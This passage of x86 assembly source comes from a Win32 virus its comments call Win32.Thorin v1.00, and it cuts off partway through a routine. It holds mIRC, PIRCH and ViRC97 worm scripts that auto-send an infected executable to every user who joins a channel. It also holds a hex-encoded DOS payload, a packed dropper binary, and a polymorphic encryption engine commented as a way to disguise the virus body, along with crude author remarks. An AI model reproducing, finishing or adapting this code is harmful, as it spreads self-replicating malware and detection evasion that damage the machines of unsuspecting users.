C4VH_Error:
	stc
	ret

; ===========================================================================
; mIRC worm
; ===========================================================================

mIRCWorm        db      "[script]",10
		db      "n0=ON 1:JOIN:#: {/if ($nick==$me) { halt }",10
		db      "n1=/dcc send $nick c:\pr0n.exe",10
		db      "n2=}",10
		db      "n3=ON 1:TEXT:*pr0n*:#:/quit Win32.mIRC32.Thorin 1.00",10
		db      "n4=ON 1:TEXT:*virus*:#:/ignore -u666 $nick",10
		db      "n5=ON 1:CONNECT: {",10
		db      "n6=/msg Billy_Bel You are the g0d of fuck!",10
		db      "n7=}",10
mIRCWormSize    equ     ($-offset mIRCWorm)

; ===========================================================================
; PIRCH worm
; ===========================================================================

PirchWorm       db      "[Levels]",10
		db      "Enabled=1",10
		db      "Count=1",10
		db      "Level1=ThorinWorm",10,10
		db      "[ThorinWorm]",10
		db      "User1=*!*@*",10
		db      "UserCount=1",10
		db      "Event1=;Thorin is here",10
		db      "Event2=ON JOIN:#:/dcc send $nick c:\pr0n.exe",10
		db      "Event3=;Win32.PIRCH32.Thorin 1.00",10
		db      "EventCount=3",10
PirchWormSize   equ     ($-offset PirchWorm)

; ===========================================================================
; ViRC97 worm
; ===========================================================================

ViRC97Worm      db      "Name Win32.ViRC97.Thorin 1.00",10
		db      "// Events",10,10
		db      'Event JOIN "* JOIN"',10
		db      "  DCC Send $nick c:\pr0n.exe",10
		db      "EndEvent",10
ViRC97WormSize  equ     ($-offset ViRC97Worm)

; ===========================================================================
; Payload code
; ===========================================================================

payl0ad label   byte
	db      0B8h, 003h, 000h, 0CDh, 010h, 0BEh, 051h, 002h
	db      0E8h, 0F7h, 000h, 033h, 0C0h, 0CDh, 016h, 03Ch
	db      063h, 074h, 003h, 0E9h, 0C7h, 000h, 0BEh, 0BCh
	db      003h, 0E8h, 0E6h, 000h, 033h, 0C0h, 0CDh, 016h
	db      03Ch, 061h, 074h, 003h, 0E9h, 0B6h, 000h, 0BEh
	db      005h, 004h, 0E8h, 0D5h, 000h, 033h, 0C0h, 0CDh
	db      016h, 03Ch, 062h, 074h, 003h, 0E9h, 0A5h, 000h
	db      0E8h, 09Bh, 000h, 059h, 06Fh, 075h, 020h, 064h
	db      065h, 06Dh, 06Fh, 06Eh, 073h, 074h, 072h, 061h
	db      074h, 065h, 064h, 02Ch, 020h, 061h, 074h, 020h
	db      06Ch, 065h, 061h, 073h, 074h, 02Ch, 020h, 074h
	db      068h, 061h, 074h, 020h, 079h, 06Fh, 075h, 020h
	db      068h, 061h, 076h, 065h, 020h, 072h, 065h, 061h
	db      064h, 020h, 027h, 054h, 068h, 065h, 020h, 048h
	db      06Fh, 062h, 062h, 069h, 074h, 027h, 02Eh, 02Eh
	db      02Eh, 00Ah, 00Dh, 041h, 06Eh, 064h, 020h, 074h
	db      068h, 069h, 073h, 020h, 06Dh, 061h, 064h, 065h
	db      073h, 020h, 079h, 06Fh, 075h, 020h, 06Fh, 06Eh
	db      065h, 020h, 06Fh, 066h, 020h, 074h, 068h, 065h
	db      020h, 063h, 068h, 06Fh, 073h, 065h, 06Eh, 02Eh
	db      020h, 04Eh, 06Fh, 077h, 020h, 073h, 069h, 06Dh
	db      070h, 06Ch, 079h, 020h, 065h, 06Eh, 074h, 065h
	db      072h, 020h, 077h, 069h, 06Eh, 064h, 06Fh, 077h
	db      073h, 00Ah, 00Dh, 064h, 069h, 072h, 065h, 063h
	db      074h, 06Fh, 072h, 079h, 020h, 061h, 06Eh, 064h
	db      020h, 074h, 079h, 070h, 065h, 020h, 027h, 077h
	db      069h, 06Eh, 027h, 00Ah, 00Dh, 024h, 05Ah, 0B4h
	db      009h, 0CDh, 021h, 0CDh, 020h, 0E4h, 021h, 00Ch
	db      002h, 0E6h, 021h, 0E8h, 015h, 000h, 00Ah, 00Dh
	db      059h, 06Fh, 075h, 020h, 061h, 072h, 065h, 020h
	db      061h, 020h, 06Ch, 06Fh, 073h, 065h, 072h, 02Eh
	db      02Eh, 02Eh, 024h, 05Ah, 0B4h, 009h, 0CDh, 021h
	db      0EBh, 0DBh, 0B4h, 00Eh, 0ACh, 00Ah, 0C0h, 074h
	db      007h, 0CDh, 010h, 0E8h, 003h, 000h, 0EBh, 0F4h
	db      0C3h, 050h, 053h, 051h, 052h, 0BAh, 040h, 001h
	db      0BBh, 000h, 002h, 0E4h, 061h, 024h, 0FCh, 034h
	db      002h, 0E6h, 061h, 081h, 0C2h, 048h, 092h, 0B1h
	db      003h, 0D3h, 0CAh, 08Bh, 0CAh, 081h, 0E1h, 0FFh
	db      001h, 083h, 0C9h, 00Ah, 0E2h, 0FEh, 04Bh, 075h
	db      0E6h, 024h, 0FCh, 0E6h, 061h, 0BBh, 001h, 000h
	db      032h, 0E4h, 0CDh, 01Ah, 003h, 0DAh, 0CDh, 01Ah
	db      03Bh, 0D3h, 075h, 0FAh, 05Ah, 059h, 05Bh, 058h
	db      0C3h, 048h, 069h, 021h, 020h, 049h, 027h, 06Dh
	db      020h, 054h, 068h, 06Fh, 072h, 069h, 06Eh, 02Ch
	db      020h, 073h, 06Fh, 06Eh, 020h, 06Fh, 066h, 020h
	db      054h, 068h, 072h, 061h, 069h, 06Eh, 02Ch, 020h
	db      073h, 06Fh, 06Eh, 020h, 06Fh, 066h, 020h, 054h
	db      068h, 072h, 06Fh, 072h, 02Eh, 02Eh, 02Eh, 00Ah
	db      00Dh, 049h, 020h, 06Fh, 077h, 06Eh, 020h, 079h
	db      06Fh, 075h, 072h, 020h, 063h, 06Fh, 06Dh, 070h
	db      075h, 074h, 065h, 072h, 020h, 073h, 069h, 06Eh
	db      063h, 065h, 020h, 073h, 06Fh, 06Dh, 065h, 020h
	db      074h, 069h, 06Dh, 065h, 020h, 061h, 067h, 06Fh
	db      02Ch, 020h, 062h, 075h, 074h, 020h, 069h, 027h
	db      076h, 065h, 020h, 062h, 065h, 065h, 06Eh, 00Ah
	db      00Dh, 069h, 06Eh, 020h, 073h, 069h, 06Ch, 065h
	db      06Eh, 063h, 065h, 020h, 073h, 069h, 06Eh, 063h
	db      065h, 020h, 06Eh, 06Fh, 077h, 02Eh, 02Eh, 02Eh
	db      020h, 049h, 020h, 068h, 061h, 076h, 065h, 06Eh
	db      027h, 074h, 020h, 06Eh, 06Fh, 074h, 068h, 069h
	db      06Eh, 067h, 020h, 061h, 067h, 061h, 069h, 06Eh
	db      069h, 073h, 074h, 020h, 070h, 065h, 06Fh, 070h
	db      06Ch, 065h, 020h, 069h, 06Eh, 00Ah, 00Dh, 067h
	db      065h, 06Eh, 065h, 072h, 061h, 06Ch, 02Ch, 020h
	db      062h, 075h, 074h, 020h, 069h, 020h, 068h, 061h
	db      074h, 065h, 020h, 074h, 068h, 065h, 020h, 069h
	db      06Eh, 063h, 075h, 06Ch, 074h, 020h, 070h, 065h
	db      06Fh, 070h, 06Ch, 065h, 02Eh, 020h, 050h, 06Ch
	db      065h, 061h, 073h, 065h, 020h, 061h, 06Eh, 073h
	db      077h, 065h, 072h, 020h, 06Dh, 065h, 020h, 063h
	db      06Fh, 072h, 072h, 065h, 063h, 074h, 06Ch, 079h
	db      00Ah, 00Dh, 00Ah, 00Dh, 031h, 02Eh, 020h, 049h
	db      06Eh, 020h, 077h, 068h, 061h, 074h, 020h, 062h
	db      06Fh, 06Fh, 06Bh, 020h, 069h, 020h, 061h, 070h
	db      070h, 065h, 061h, 072h, 020h, 061h, 073h, 020h
	db      06Fh, 06Eh, 065h, 020h, 06Fh, 066h, 020h, 074h
	db      068h, 065h, 020h, 06Dh, 061h, 069h, 06Eh, 020h
	db      063h, 068h, 061h, 072h, 061h, 063h, 074h, 065h
	db      072h, 073h, 03Fh, 00Ah, 00Dh, 020h, 05Bh, 061h
	db      05Dh, 020h, 054h, 068h, 065h, 020h, 04Ch, 06Fh
	db      072h, 064h, 020h, 04Fh, 066h, 020h, 054h, 068h
	db      065h, 020h, 052h, 069h, 06Eh, 067h, 073h, 00Ah
	db      00Dh, 020h, 05Bh, 062h, 05Dh, 020h, 054h, 068h
	db      065h, 020h, 053h, 069h, 06Ch, 06Dh, 061h, 072h
	db      069h, 06Ch, 06Ch, 069h, 06Fh, 06Eh, 00Ah, 00Dh
	db      020h, 05Bh, 063h, 05Dh, 020h, 054h, 068h, 065h
	db      020h, 048h, 06Fh, 062h, 062h, 069h, 074h, 00Ah
	db      00Dh, 00Ah, 00Dh, 000h, 032h, 02Eh, 020h, 057h
	db      068h, 061h, 074h, 020h, 061h, 06Dh, 020h, 069h
	db      020h, 069h, 06Eh, 020h, 074h, 068h, 061h, 074h
	db      020h, 062h, 06Fh, 06Fh, 06Bh, 03Fh, 00Ah, 00Dh
	db      020h, 05Bh, 061h, 05Dh, 020h, 041h, 020h, 064h
	db      077h, 061h, 072h, 066h, 00Ah, 00Dh, 020h, 05Bh
	db      062h, 05Dh, 020h, 041h, 06Eh, 020h, 065h, 06Ch
	db      066h, 00Ah, 00Dh, 020h, 05Bh, 063h, 05Dh, 020h
	db      041h, 020h, 068h, 06Fh, 062h, 062h, 069h, 074h
	db      00Ah, 00Dh, 00Ah, 00Dh, 000h, 033h, 02Eh, 020h
	db      057h, 068h, 061h, 074h, 020h, 069h, 073h, 020h
	db      074h, 068h, 065h, 020h, 06Eh, 061h, 06Dh, 065h
	db      020h, 06Fh, 066h, 020h, 074h, 068h, 065h, 020h
	db      064h, 072h, 061h, 067h, 06Fh, 06Eh, 03Fh, 00Ah
	db      00Dh, 020h, 05Bh, 061h, 05Dh, 020h, 053h, 063h
	db      068h, 072h, 094h, 065h, 064h, 065h, 072h, 00Ah
	db      00Dh, 020h, 05Bh, 062h, 05Dh, 020h, 053h, 06Dh
	db      061h, 075h, 067h, 00Ah, 00Dh, 020h, 05Bh, 063h
	db      05Dh, 020h, 053h, 074h, 061h, 06Ch, 069h, 06Eh
	db      00Ah, 00Dh, 00Ah, 00Dh, 000h
p_size  equ     ($-offset payl0ad)

; ===========================================================================
; Dropper code (packed)
; ===========================================================================

dropper label   byte
	db      04Dh, 05Ah, 0F8h, 000h, 001h, 000h, 016h, 000h
	db      003h, 000h, 004h, 000h, 003h, 000h, 0FFh, 0FFh
	db      0F0h, 0FFh, 000h, 001h, 000h, 001h, 000h, 003h
	db      000h, 001h, 0F0h, 0FFh, 040h, 000h, 024h, 000h
	db      001h, 000h, 002h, 000h, 0E9h, 000h, 002h, 000h
	db      0E8h, 041h, 000h, 001h, 000h, 046h, 075h, 063h
	db      06Bh, 020h, 079h, 06Fh, 075h, 020h, 061h, 073h
	db      073h, 068h, 06Fh, 06Ch, 065h, 021h, 020h, 054h
	db      068h, 069h, 073h, 020h, 072h, 065h, 071h, 075h
	db      069h, 072h, 065h, 073h, 020h, 061h, 020h, 057h
	db      069h, 06Eh, 033h, 032h, 020h, 065h, 06Eh, 076h
	db      069h, 072h, 06Fh, 06Dh, 065h, 06Eh, 074h, 02Eh
	db      02Eh, 02Eh, 020h, 020h, 00Dh, 00Ah, 024h, 00Eh
	db      01Fh, 0B4h, 009h, 0CDh, 021h, 0C3h, 05Ah, 0E8h
	db      0F5h, 0FFh, 0B4h, 04Ch, 0CDh, 021h, 000h, 071h
	db      000h, 050h, 045h, 000h, 002h, 000h, 04Ch, 001h
	db      005h, 000h, 001h, 000h, 0ABh, 026h, 00Ah, 0B4h
	db      000h, 008h, 000h, 0E0h, 000h, 001h, 000h, 08Eh
	db      083h, 00Bh, 001h, 002h, 019h, 000h, 001h, 000h
	db      002h, 000h, 003h, 000h, 004h, 000h, 008h, 000h
	db      001h, 000h, 003h, 000h, 002h, 000h, 003h, 000h
	db      003h, 000h, 003h, 000h, 040h, 000h, 003h, 000h
	db      001h, 000h, 002h, 000h, 002h, 000h, 002h, 000h
	db      001h, 000h, 007h, 000h, 003h, 000h, 001h, 000h
	db      00Ah, 000h, 007h, 000h, 006h, 000h, 002h, 000h
	db      004h, 000h, 006h, 000h, 002h, 000h, 005h, 000h
	db      001h, 000h, 002h, 000h, 020h, 000h, 004h, 000h
	db      001h, 000h, 002h, 000h, 010h, 000h, 006h, 000h
	db      010h, 000h, 00Dh, 000h, 004h, 000h, 001h, 000h
	db      04Ch, 000h, 01Dh, 000h, 005h, 000h, 001h, 000h
	db      018h, 000h, 053h, 000h, 043h, 04Fh, 044h, 045h
	db      000h, 005h, 000h, 010h, 000h, 004h, 000h, 001h
	db      000h, 002h, 000h, 002h, 000h, 003h, 000h, 006h
	db      000h, 011h, 000h, 060h, 02Eh, 069h, 063h, 06Fh
	db      064h, 065h, 000h, 003h, 000h, 010h, 000h, 004h
	db      000h, 002h, 000h, 002h, 000h, 002h, 000h, 003h
	db      000h, 008h, 000h, 00Eh, 000h, 020h, 000h, 002h
	db      000h, 060h, 044h, 041h, 054h, 041h, 000h, 005h
	db      000h, 010h, 000h, 004h, 000h, 003h, 000h, 006h
	db      000h, 00Ah, 000h, 00Eh, 000h, 040h, 000h, 002h
	db      000h, 0C0h, 02Eh, 069h, 064h, 061h, 074h, 061h
	db      000h, 003h, 000h, 010h, 000h, 004h, 000h, 004h
	db      000h, 002h, 000h, 002h, 000h, 003h, 000h, 00Ah
	db      000h, 00Eh, 000h, 040h, 000h, 002h, 000h, 0C0h
	db      02Eh, 072h, 065h, 06Ch, 06Fh, 063h, 000h, 003h
	db      000h, 010h, 000h, 004h, 000h, 005h, 000h, 002h
	db      000h, 002h, 000h, 003h, 000h, 00Ch, 000h, 00Eh
	db      000h, 040h, 000h, 002h, 000h, 050h, 000h, 040h
	db      003h, 0FFh, 035h, 008h, 000h, 001h, 000h, 043h
	db      000h, 001h, 000h, 0E8h, 0F5h, 0FFh, 000h, 0F7h
	db      001h, 0FFh, 025h, 028h, 000h, 001h, 000h, 044h
	db      000h, 007h, 002h, 030h, 000h, 001h, 000h, 004h
	db      000h, 001h, 000h, 028h, 000h, 001h, 000h, 004h
	db      000h, 015h, 000h, 03Eh, 000h, 001h, 000h, 004h
	db      000h, 005h, 000h, 04Bh, 045h, 052h, 04Eh, 045h
	db      04Ch, 033h, 032h, 02Eh, 064h, 06Ch, 06Ch, 000h
	db      004h, 000h, 045h, 078h, 069h, 074h, 050h, 072h
	db      06Fh, 063h, 065h, 073h, 073h, 000h, 0B7h, 001h
	db      001h, 000h, 001h, 000h, 00Ch, 000h, 003h, 000h
	db      002h, 030h, 000h, 004h, 000h, 002h, 000h, 001h
	db      000h, 00Ch, 000h, 003h, 000h, 002h, 030h, 000h
	db      0E2h, 01Eh
dropper_size equ ($-offset dropper)

; ===========================================================================
; [THME] - The Hobbit Mutation Engine
; ===========================================================================
;
; ?????????????? ???????????????????????????????????????????» ??????????????
; ???????????????? ??? ??????? ??   ?? ???????? ??????? ??? ????????????????
; ??????????????   ??    ???   ??????? ?? ?? ?? ??????   ??   ??????????????
; ??????????????   ??    ???   ??????? ?? ?? ?? ??????   ??   ??????????????
; ???????????????» ???   ???   ??   ?? ?? ?? ?? ??????? ??? ????????????????
; ?????????????? ???????????????????????????????????????????? ??????????????
;
;
; This is a little polymorphic engine dessigned for my Win32.Thorin v1.00 vi-
; rus. It isn't very powerful, as it wasn't dessigned to be an unreachable
; engine, because the virus is enough big without poly, so i didn't wanted it
; to grow too much. It isn't my first poly engine for Win32 enviroments, but
; it is the first one i finished (and the simplest one). It is messy, unopti-
; mized, etc. But let me talk about its features:
;
; ? Non-realistic code (copro used, etc)
; ? Able of use any register (except ESP) as Pointer, Counter, and Delta.
; ? Crypt operations : ADD/SUB/XOR
; ? Garbage generator abilities:
;   - CALLs to subroutines (can be recursive)
;   - Arithmetic operations REG32/REG32
;   - Arithmetic operations REG32/IMM32
;   - Arithmetic operations EAX32/IMM32
;   - MOV reg32,reg32/imm32
;   - MOV reg16,reg16/imm16
;   - PUSH/Garbage/POP structures
;   - Coprocessor opcodes
;   - Simple onebyters
; ? Encryptor fixed size, 2048 bytes.
;
; I coded this engine in a record time ;) Pfff, maaaany improvements could be
; made, i know, but i think there will be another versions of the virus, so i
; will try to fix bugs (if any) and improve the junk generation, that is very
; weak, as well as the encryption is.
;
; input:
;       ECX = Size of code to encrypt/4
;       ESI = Pointer to the data to encrypt
;       EDI = Buffer where the decryptor+encrypted virus body will go
;       EBP = Delta Offset
; output:
;       ECX = Decryptor size
;
;       All the other registers, preserved.
;

LIMIT           equ     400h                    ; Decryptor size

RECURSION       equ     05h                     ; The recursion level of THME

_EAX            equ     00000000b               ; All these are the numeric
_ECX            equ     00000001b               ; value of all the registers.
_EDX            equ     00000010b               ; Heh, i haven't used here 
_EBX            equ     00000011b               ; all this, but... wtf? they
_ESP            equ     00000100b               ; don't waste bytes, and ma-
_EBP            equ     00000101b               ; ke this shit to be more
_ESI            equ     00000110b               ; clear :)
_EDI            equ     00000111b               ;

; [ PUSHAD structure ]

PUSHAD_EDI      equ     00h
PUSHAD_ESI      equ     04h
PUSHAD_EBP      equ     08h
PUSHAD_ESP      equ     0Ch
PUSHAD_EBX      equ     10h
PUSHAD_EDX      equ     14h
PUSHAD_ECX      equ     18h
PUSHAD_EAX      equ     1Ch

RETURN_ADDRESS  equ     04h

; [ THME_CryptOp ]

_XOR            equ     00000001b               ; XOR / XOR \
_ADD            equ     00000010b               ; ADD / SUB  >  Base crypt
_SUB            equ     00000100b               ; SUB / ADD /

; mamamamamama weer creezy now...

salc            equ     

THME            proc
	pushad
	call    THME_InitVariables              ; Initialize poly engine

	call    THME_BunchOfShit                ; Garbage!

	mov     eax,sTHME_Decrypt1              ; Get decryptor order in its
	call    r_range                         ; first part
	lea     esi,[ebp+THME_Decrypt1+eax*4]
	lodsd
	add     eax,ebp
	xchg    eax,esi

	mov     ecx,3                           ; Generate real instruction
THME_BuildIt:                                   ; plus some garbage
	lodsd
	add     eax,ebp
	push    esi ecx
	call    eax
	call    THME_BunchOfShit
	pop     ecx esi
	loop    THME_BuildIt

	call    THME_BunchOfShit                ; Generate the last part of
	call    THME_StoreLoop                  ; the poly
	call    THME_BunchOfShit
	call    THME_GenCryptOperations
	call    THME_BunchOfShit
	call    THME_GenIncPointer
	call    THME_BunchOfShit
	call    THME_GenDecCounter
	call    THME_GenLoop
	call    THME_BunchOfShit

	mov     al,0E9h                         ; Generate the JMP to the 
	stosb                                   ; decrypted virus code
	mov     eax,LIMIT
	mov     ebx,edi
	sub     ebx,dword ptr [ebp+THME_Pointer]
	add     ebx,04h
	sub     eax,ebx
	stosd

	xchg    eax,ecx                         ; Fill with shit the rest
THME_FillTheRest:
	call    random
	stosb
	loop    THME_FillTheRest
	
	call    THME_CryptData

	call    THME_ClosePoly
	popad
	ret

	db      00h,"[THME v1.00]",00h

THME_InitVariables:
	mov     dword ptr [ebp+THME_Pointer],edi ; Save all given data
	mov     dword ptr [ebp+THME_Data2crypt],esi
	mov     dword ptr [ebp+THME_S2C_div4],ecx
	and     byte ptr [ebp+THME_Recursion],00h
THME_IV_GetCounter:                             ; Get a valid register for
	mov     eax,08h                         ; use as counter
	call    r_range
	or      eax,eax
	jz      THME_IV_GetCounter
	cmp     eax,_ESP
	jz      THME_IV_GetCounter
	mov     byte ptr [ebp+THME_CounterReg],al
	mov     ebx,eax
THME_IV_GetPointer:                             ; Get a valid register for
	mov     eax,08h                         ; use as a pointer
	call    r_range
	or      eax,eax
	jz      THME_IV_GetPointer
	cmp     eax,_ESP
	jz      THME_IV_GetPointer
	cmp     eax,ebx
	jz      THME_IV_GetPointer
	mov     byte ptr [ebp+THME_PointerReg],al
	mov     ecx,eax

THME_IV_GetDelta:                               ; Get a valid register for 
	mov     eax,08h                         ; use as delta
	call    r_range
	or      eax,eax
	jz      THME_IV_GetDelta
	cmp     eax,_ESP
	jz      THME_IV_GetDelta
	cmp     eax,ebx
	jz      THME_IV_GetDelta
	cmp     eax,ecx
	jz      THME_IV_GetDelta
	mov     byte ptr [ebp+THME_DeltaReg],al

	call    random                          ; Get math operation for crypt
	and     al,00000111b
	mov     byte ptr [ebp+THME_CryptOp],al
	
	mov     dword ptr [edi],"EMHT"          ; Mark :)
	ret

THME_ClosePoly:                                 ; Return in ECX the size of
	mov     ecx,edi                         ; the engine (not needed)
	sub     ecx,dword ptr [ebp+THME_Pointer]
	mov     [esp.RETURN_ADDRESS.PUSHAD_ECX],ecx     
	ret

; THME_GETREGISTER
;
; input:
;       Nothing.
; output:
;       AL = Register unused by the decryptor
;

THME_GetRegister:                               
	movzx   ebx,byte ptr [ebp+THME_CounterReg]
	movzx   ecx,byte ptr [ebp+THME_PointerReg]
	movzx   edx,byte ptr [ebp+THME_DeltaReg]
THME_GR_GetIt:
	mov     eax,08h                         ; Get a register
	call    r_range
	cmp     eax,_ESP                        ; Mustn't be ESP
	jz      THME_GR_GetIt
	cmp     eax,ebx                         ; Mustn't be equal to counter
	jz      THME_GR_GetIt
	cmp     eax,ecx                         ; Mustn't be equal to pointer
	jz      THME_GR_GetIt
	cmp     eax,edx                         ; Mustn't be equal to delta
	jz      THME_GR_GetIt
	ret

; Garbage generator (recursion depht = 3)

THME_GenGarbage:
	inc     byte ptr [ebp+THME_Recursion]   ; Increase recursivity
	cmp     byte ptr [ebp+THME_Recursion],RECURSION ; Over our limit?
	jae     THME_GG_Exit                    ; Shitz...

	mov     eax,sTHME_GBG_Table             ; Select a garbage generator
	call    r_range                         ; from our table
	lea     ebx,[ebp+THME_GBG_Table]
	mov     eax,[ebx+eax*4]
	add     eax,ebp
	call    eax                             ; Call it

THME_GG_Exit:
	dec     byte ptr [ebp+THME_Recursion]   ; Decrease recursion level
	ret

; Call 6 times to the garbage generator

THME_BunchOfShit:
	mov     ecx,0Ch
THME_BOS_Loop:
	push    ecx
	call    THME_GenGarbage
	pop     ecx
	loop    THME_BOS_Loop
	ret

; THME_GBGB_GETVALIDRIB
;
; input:
;       Nothing.
; output:
;       AL = RegInfoByte that could be used for garbage regxx/regxx
;

THME_GBG_GetValidRiB:
	xor     eax,eax
	call    THME_GetRegister                ; Get a valid register for be
	mov     ecx,eax                         ; the target
	shl     eax,3
	push    eax
THME_GBG_GVRiB:
	mov     eax,8                           ; Get any register for be used
	call    r_range                         ; as source
	cmp     eax,ecx
	jz      THME_GBG_GVRiB                  ; Can't be source=target
	xchg    ebx,eax
	pop     eax
	add     eax,ebx
	add     al,11000000b                    ; Fix this 
	ret

; ---

THME_GBG_Arithmetic_EAX_IMM32:
	call    random
	and     al,00111000b                    ; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP
	or      al,00000101b            
	stosb
	call    random
	stosd
	ret

THME_GBG_Arithmetic_REG32_REG32:
	call    random
	and     al,00111000b                    ; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP
	or      al,00000011b    
	stosb
THME_GBG_A_R32_R32_GR:
	call    THME_GetRegister                ; Don't use EAX
	or      al,al
	jz      THME_GBG_A_R32_R32_GR
	shl     eax,3
	add     al,11000000b
	push    eax
	call    random
	and     al,00000111b
	xchg    ebx,eax
	pop     eax
	add     al,bl
	stosb
	ret 

THME_GBG_Arithmetic_REG32_IMM32:
	mov     al,81h                          ; ADD/OR/ADC/SBB/AND/SUB/XOR/CMP
	stosb
THME_GBG_A_R32_I32_GR:
	call    THME_GetRegister
	or      al,al
	jz      THME_GBG_A_R32_I32_GR
	push    eax
	call    random       
	and     al,00111000b
	add     al,11000000b
	pop     ebx
	add     al,bl
	stosb
	call    random
	stosd
	ret

THME_GBG_GenOneByter:                   
	mov     eax,sTHME_OneByters             ; NOP/LAHF/INC EAX/DEC EAX/STI/CLD/
	call    r_range                         ; CMC/STC/CLC
	mov     al,[ebp+THME_OneByters+eax]
	stosb
	ret

THME_GBG_GenCopro:
	cmp     byte ptr [ebp+THME_CoproInit],00h ; If first call, put a FINIT
	jz      THME_GC_GenFINIT        
	mov     eax,sTHME_OneByters             ; If not, put any copro opcode
	call    r_range

	lea     ebx,[ebp+THME_Copro]
	movzx   eax,word ptr [ebx+eax*2]
	stosw
	ret

THME_GC_GenFINIT:
	inc     byte ptr [ebp+THME_CoproInit]
	mov     ax,0E3DBh                       ; FINIT
	stosw
	ret

THME_GBG_MOV_REG16_REG16:
	mov     al,66h                          ; MOV ?X,?X
	stosb
	call    THME_GBG_GetValidRiB
	push    eax
	mov     al,08Bh
	stosb
	pop     eax
	stosb
	ret

THME_GBG_MOV_REG16_IMM16:
	mov     al,66h                          ; MOV ?X,????
	stosb
	call    THME_GetRegister
	add     al,0B8h
	stosb
	call    random
	stosw
	ret

THME_GBG_MOV_REG32_REG32:
	call    THME_GBG_GetValidRiB            ; MOV E??,E??
	push    eax
	mov     al,8Bh
	stosb
	pop     eax
	stosb
	ret

THME_GBG_MOV_REG32_IMM32:
	call    THME_GetRegister                ; MOV E??,????????
	add     al,0B8h
	stosb
	call    random
	stosd
	ret

THME_GBG_GenPUSHPOP:                            ; PUSH E??
	mov     eax,8                           ; ...
	call    r_range                         ; POP E??
	add     al,50h
	stosb
	call    THME_GenGarbage
	call    THME_GetRegister
	add     al,58h
	stosb
	ret

THME_GBG_GenCALL_Type1:                         ; CALL @@1
	mov     al,0E8h                         ; ...
	stosb                                   ; JMP @@2
	xor     eax,eax                         ; ...
	stosd                                   ; @@1:
	push    edi                             ; ...
	call    THME_GenGarbage                 ; RET
	mov     al,0E9h                         ; ...
	stosb                                   ; @@2:
	xor     eax,eax                         ; ...
	stosd
	push    edi
	call    THME_GenGarbage
	mov     al,0C3h
	stosb
	call    THME_GenGarbage
	mov     ebx,edi
	pop     edx
	sub     ebx,edx
	mov     [edx-4],ebx
	pop     ecx
	sub     edx,ecx
	mov     [ecx-4],edx
	ret       

; ---

THME_CryptData:                         ; Encrypt given data with proper operation
	mov     esi,dword ptr [ebp+THME_Data2crypt]
	mov     edi,esi
	mov     ecx,dword ptr [ebp+THME_S2C_div4]
THME_CD_EncryptLoop:
	lodsd
	push    ecx
	call    THME_DoCryptOperations
	pop     ecx
	stosd
	loop    THME_CD_EncryptLoop
	ret

THME_DoCryptOperations:
	test    byte ptr [ebp+THME_CryptOp],_XOR
	jz      THME_DCO_XOR
	test    byte ptr [ebp+THME_CryptOp],_ADD
	jz      THME_DCO_ADD
THME_DCO_SUB:
	add     eax,dword ptr [ebp+THME_Key1]
	jmp     THME_DCO_EXIT
THME_DCO_ADD:
	sub     eax,dword ptr [ebp+THME_Key1]
	jmp     THME_DCO_EXIT
THME_DCO_XOR:
	xor     eax,dword ptr [ebp+THME_Key1]
THME_DCO_EXIT:
	ret

; ---

THME_GenDeltaOffset:                            ; CALL @@1
	mov     eax,10h                         ; ...
	call    r_range                         ; @@1:
	xchg    eax,ebx                         ; POP E??
	mov     al,0E8h
	stosb
	xor     eax,eax
	stosd
	mov     dword ptr [ebp+THME_GDO_TmpCll],edi
	call    THME_GenGarbage
	mov     ecx,dword ptr [ebp+THME_GDO_TmpCll]
	mov     ebx,edi
	sub     ebx,ecx
	mov     [ecx-4],ebx
	mov     al,58h
	add     al,byte ptr [ebp+THME_DeltaReg]
	stosb
	mov     ebx,dword ptr [ebp+THME_Pointer]
	sub     ecx,ebx
	mov     dword ptr [ebp+THME_Fix1],ecx
	ret

THME_GenLoadSize:
	mov     eax,2
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GLS_@@2
THME_GLS_@@1:
	mov     al,68h                          ; PUSH ????????
						; ...
	stosb                                   ; POP E??
	mov     eax,dword ptr [ebp+THME_S2C_div4]
	stosd
	call    THME_GenGarbage
	mov     al,58h
	add     al,byte ptr [ebp+THME_CounterReg]
	stosb
	ret
THME_GLS_@@2:
	movzx   eax,byte ptr [ebp+THME_CounterReg]
	add     eax,0B8h                        ; MOV E??,????????
	stosb
	mov     eax,dword ptr [ebp+THME_S2C_div4]
	stosd
	ret

THME_GenLoadPointer:
	mov     al,8Dh                          ; LEA E??,[E??+????????]
	stosb
	movzx   eax,byte ptr [ebp+THME_PointerReg]
	shl     al,3
	add     al,10000000b
	add     al,byte ptr [ebp+THME_DeltaReg]
	stosb
	mov     eax,LIMIT
	sub     eax,dword ptr [ebp+THME_Fix1]
	stosd
	ret

THME_StoreLoop:
	mov     dword ptr [ebp+THME_LoopAddress],edi
	ret

THME_GenCryptOperations:
	mov     al,81h
	stosb
	test    byte ptr [ebp+THME_CryptOp],_XOR
	jz      THME_GCO_XOR
	test    byte ptr [ebp+THME_CryptOp],_ADD
	jz      THME_GCO_ADD
THME_GCO_SUB:
	mov     al,28h                          ; SUB [E??],????????
	jmp     THME_GCO_BuildRiB
THME_GCO_ADD:
	xor     al,al                           ; ADD [E??],????????
	jmp     THME_GCO_BuildRiB
THME_GCO_XOR:
	mov     al,30h                          ; XOR [E??],????????
THME_GCO_BuildRiB:
	add     al,byte ptr [ebp+THME_PointerReg]
	cmp     byte ptr [ebp+THME_PointerReg],_EBP
	jnz     THME_GCO_BR_NoEBP
	or      al,01000000b
	stosb
	xor     al,al
	stosb
	jmp     $+3
THME_GCO_BR_NoEBP:
	stosb
	call    random
	mov     dword ptr [ebp+THME_Key1],eax
	stosd
THME_GCO_EXIT:
	ret

THME_GenIncPointer:
	mov     eax,5
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GIP_@@2
	dec     ecx
	jecxz   THME_GIP_@@3
	dec     ecx
	jecxz   THME_GIP_@@4
	dec     ecx
	jnz     THME_GIP_@@1
	jmp     THME_GIP_@@5

THME_GIP_@@1:
	mov     bl,4                            ; ADD E??,4
	call    THME_GIP_AddIt
	jmp     THME_GIP_EXIT

THME_GIP_@@2:
	mov     eax,2                   
	call    r_range
	xchg    eax,ecx
	jecxz   THME_GIP_@@2_@@2
THME_GIP_@@2_@@1:
	mov     bl,3                            ; ADD E??,3
	call    THME_GIP_AddIt
	mov     bl,1                            ; INC E??
	call    THME_GIP_IncIt
	jmp     THME_GIP_@@2_EXIT
THME_GIP_@@2_@@2:
	mov     bl,1                            ; INC E??
